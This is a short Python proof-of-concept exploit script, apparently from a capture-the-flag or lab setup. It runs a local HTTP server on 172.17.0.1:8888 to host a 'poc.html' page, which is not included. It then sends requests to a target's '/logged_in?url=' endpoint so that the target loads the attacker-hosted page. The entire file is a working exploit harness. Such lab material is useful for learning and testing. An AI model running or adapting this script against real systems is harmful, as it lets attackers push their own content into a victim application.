from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler
import threading
import logging
import re
import requests

TARGET_URL = 'http://0.0.0.0:8000'
PORT = 8888
SERVER_IP = '172.17.0.1'

class S(SimpleHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def log_message(self, format, *args):
        return

def start_server():
    server_class=HTTPServer
    handler_class=S
    port=PORT
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

def send_exploit():
    res = requests.get(f"{TARGET_URL}/logged_in?url=http://{SERVER_IP}:{PORT}/poc.html")
    print(res.text)
    res = requests.get(f"{TARGET_URL}/logged_in?url=http://{SERVER_IP}:{PORT}/poc.html")
    print(res.text)

def main():
    t1 = threading.Thread(target=start_server)
    t2 = threading.Thread(target=send_exploit)
    t2.start()
    t1.start()
    t1.join()
    t2.join()

main()